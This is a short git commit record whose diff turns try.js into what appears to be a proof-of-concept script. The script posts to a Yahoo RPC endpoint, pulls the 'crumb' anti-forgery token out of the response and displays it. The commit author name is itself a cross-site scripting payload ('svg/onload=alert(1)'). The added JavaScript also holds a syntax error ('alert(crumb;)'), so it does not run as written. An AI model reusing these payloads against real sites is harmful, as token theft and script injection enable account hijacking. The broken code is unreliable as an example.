074e49c18c9fa2d0878b298f8bd46894de6a095c
svg/onload=alert(1) <mangoiscat@gmail.com>
2017-09-01 16:32:41 +0000

    Update try.js

--- try.js
+++ try.js
@@ -1,1 +1,10 @@
-alert('bull');
+var url="https://prod.iris.yahoo.com/prod/rpc?v=8&crumb=";
+var fetch= new XMLHttpRequest();
+fetch.onreadystatechange= function(){
+if(fetch.readyState == fetch.DONE) {
+request_data = JSON.parse(fetch.responseText);var crumb= request_data.crumb;alert(crumb;);
+
+}
+}
+fetch.open("post",url,false);
+fetch.send();
